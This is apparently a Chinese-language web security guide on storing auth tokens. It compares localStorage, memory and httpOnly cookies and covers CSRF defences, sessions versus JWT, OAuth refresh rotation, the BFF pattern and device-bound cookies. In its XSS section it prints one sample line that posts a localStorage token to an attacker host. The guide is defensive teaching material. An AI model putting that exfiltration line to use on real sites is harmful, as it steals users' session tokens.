存储方案对比 XSS 威胁 httpOnly Cookie CSRF 三道防线 Session vs JWT OAuth 模式 BFF 架构 2026 新威胁 TLDR

1三种存储方案对比

方案安全性要点
localStorage最不安全❌ 任何页面 JS 都能读全部内容（含依赖、分析脚本、XSS 攻击者）。一行 getItem 即可外泄，攻击者带回自己机器长期冒充，无状态 JWT 无法吊销。
内存变量稍好⚠️ 比 localStorage 难枚举，但同源 JS 仍能替换 fetch 偷 token。缺点：刷新即登出、多标签页各自为政，需 refresh token 补救。
httpOnly Cookie推荐✅ JS 彻底读不到，XSS 偷不走。前端代码更简单。但带来 CSRF 问题（见下）。

2XSS 对 token 做了什么

localStorage 的定义性缺陷：页面上任何 JS 都能读取全部内容。一旦发生 XSS：

fetch('https://attacker.example/collect', {
  method: 'POST',
  body: localStorage.getItem('token'),
});
关键区分：攻击者能偷走 token（带回家，标签页关了照用，直到过期）vs 只能读取/骑用活会话（只能在受害者浏览器内、你的限流/日志/风控眼皮底下操作）。
→ httpOnly 阻止"偷走带回家"，但不阻止 XSS 本身。目标是"缩小爆炸半径"：把 token 放到 JS 读不到的地方。

⚠️ 任何说"httpOnly cookie 能防 XSS"的人，要么搞混了，要么在卖东西。

3httpOnly Cookie：JS 读不到的地方

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
  • HttpOnly — 永不交给 JS，攻击者脚本也读不到
  • Secure — 只走 HTTPS，不在咖啡店网络明文传输
  • SameSite — 跨站请求不携带（有一个例外，见 CSRF）

前端代码反而更简单——没有 token 要管，请求只需 credentials: 'include'：

await fetch('/api/login', { method:'POST', credentials:'include', ... });
// 响应体里没有 token，代码里根本没有 token
const res = await fetch('/api/me', { credentials:'include' });
__Host- 前缀：把 cookie 命名为 __Host-session，浏览器强制它必须 Secure、无 Domain（锁死到确切主机、无子域）、Path=/。OWASP 称之为最安全配置——只改一个名字就免费加固。

4CSRF：Cookie 带来的新问题 + 三道防线

Cookie 会自动随请求携带 → 恶意站点可诱导浏览器发出你没打算发的已认证请求（跨站请求伪造）。localStorage 版本反而免疫此攻击。防御栈（按优先级）：

① CSRF Token（首要）— double-submit 模式

服务端把不可预测的值放进页面，每个变更请求必须回传。恶意表单读不到你的页面（同源策略），所以拿不到这个值。

headers: { 'X-CSRF-Token': getCsrfToken() ?? '' }
// 服务端只在 cookie 与 header 匹配时接受
// 攻击者能设 cookie，但无法为跨站请求加自定义 header

② SameSite（第二道）

Strict/Lax 阻止跨站携带。两个坑：Lax 对顶级 GET 导航有例外（→ 若 GET 能转账就危险）；只防 "site" 不防 "origin"，同站子域之间无效。

③ Origin 检查（第三道）

const site = req.get('Sec-Fetch-Site');
if (site && site !== 'same-origin')
  return res.status(403).json({ error: 'cross-site rejected' });
顺序：CSRF token → SameSite → Origin 检查。别把 SameSite 当唯一防线。

5Session vs JWT：单应用该选谁

JWT 的"无状态"有黑暗面：签发后到过期前无法吊销。用户登出/改密码/被封号，旧 token 照样有效。要补救就得维护"已吊销列表"每次请求都查——你已经重新发明了服务端 session，只是 token 更大。

单后端单前端 → 老派 2005 服务端 session 完胜：cookie 存不透明随机串，服务端查一行匹配用户。角色/封禁/降权每次请求实时读取；登出 = 删一行，立即全设备失效。 
const sessionId = crypto.randomBytes(32).toString('hex'); // 不透明、无意义
await db.sessions.create({ id: sessionId, userId: user.id });
res.cookie('__Host-session', sessionId, { httpOnly:true, secure:true, sameSite:'lax', path:'/' });

⚠️ 防会话固定：登录时必须签发全新 session ID，绝不复用客户端递来的 ID。2FA、提权、重新认证等场景同样每次生成新 ID。

JWT 真正适用的场景

  • 微服务内部互信：短命 JWT 随请求流转，各服务本地校验身份，不必都去锤同一个 session store
  • SSO / "Sign in with Google"：读一次 JWT 断言身份，开启自己的 session，然后把 JWT 扔掉

6OAuth 场景的最佳实践

  • access token → 内存（短命 5–15 分钟，被偷最多 15 分钟窗口）
  • refresh token → httpOnly cookie，path 限定到刷新端点
res.cookie('refresh_token', refreshToken, {
  httpOnly:true, secure:true, sameSite:'strict',
  path:'/api/refresh', // 只发到这一个端点
});
Refresh Token 轮转 + 重用检测：每次刷新都换新 token 并作废旧的。若旧 token（单次使用）再次出现 = 被盗信号，服务端烧毁整条链强制重登，被盗凭证自行失效。
RFC 9700（2025 初）要求浏览器客户端必须做轮转。Auth0/Okta 默认开启。

⚠️ React 落地坑：高并发下多个 401 同时触发刷新会误杀轮转 → 把刷新 Promise 缓存起来，让所有并发请求共享同一次刷新（并加小的宽限期应对双标签页并发）。

7最安全架构：BFF（Backend for Frontend）

IETF《OAuth 2.0 for Browser-Based Applications》排名第一：浏览器不持有任何 OAuth token——不在内存、不在 cookie。

  • SPA 只拿一个 httpOnly session cookie（"寄存牌"，随机串对偷者毫无意义）
  • BFF（薄服务端）保管真 token，代理转发所有 API 请求，token 从不离开服务器
  • 附带把 OAuth 从"公开客户端（弱流程）"升级为"机密客户端（强流程）"
app.all('/api/*splat', async (req, res) => {
  const session = await sessions.get(req.cookies['__Host-session']);
  if (!session) return res.status(401)...;
  let accessToken = session.accessToken;      // 真 token 从不下发浏览器
  if (Date.now() >= session.expiresAt) { ...refresh 服务端到服务端... }
  const upstream = await fetch(`https://api.example.com${...}`, {
    headers: { Authorization: `Bearer ${accessToken}` }, ...
  });  // 转发结果给浏览器
});
强烈推荐用于业务/敏感/涉个人数据的应用。代价：多一跳延迟 + 额外基建，且仍需防 CSRF（同样三道防线）。

82026 的新威胁：信息窃取木马

Infostealer 是用户机器上的原生程序，绕过以上所有防线：不需要 XSS、不在乎 httpOnly。它直接读磁盘上 Chrome 的 cookie 数据库、解密、复制你的 session cookie，导入自己浏览器 = "pass-the-cookie" 攻击。

httpOnly 只挡 JS 读 cookie，挡不住本地进程读文件。2025 年信息窃取日志包达 5170 万个（同比 +72%）。完美实现的 BFF 也挡不住。

解法：DBSC（设备绑定会话凭证）

  • Chrome 146（2026-04，Windows 首发；macOS Secure Enclave 跟进中）
  • 登录时在 TPM 安全芯片生成不可导出的私钥
  • cookie 短命，每几分钟需用硬件密钥签名刷新 → 偷走的 cookie 几分钟内烂掉，攻击者无法刷新
  • 需服务端支持；若木马已在机器上，可能干扰注册环节

构建高敏感应用 → 现在就开始读 DBSC 文档。

✓TLDR

  • ❌ 别用 localStorage 存 token
  • ✅ 单应用：服务端 session + __Host- httpOnly cookie + CSRF 三道防线
  • ✅ OAuth：access(内存) / refresh(httpOnly cookie) + 轮转 & 重用检测
  • ✅ 高安全需求：上 BFF（浏览器不碰任何 token）
  • 🛡️ 面向 2026 infostealer：盯紧 DBSC（设备绑定 / 硬件密钥）
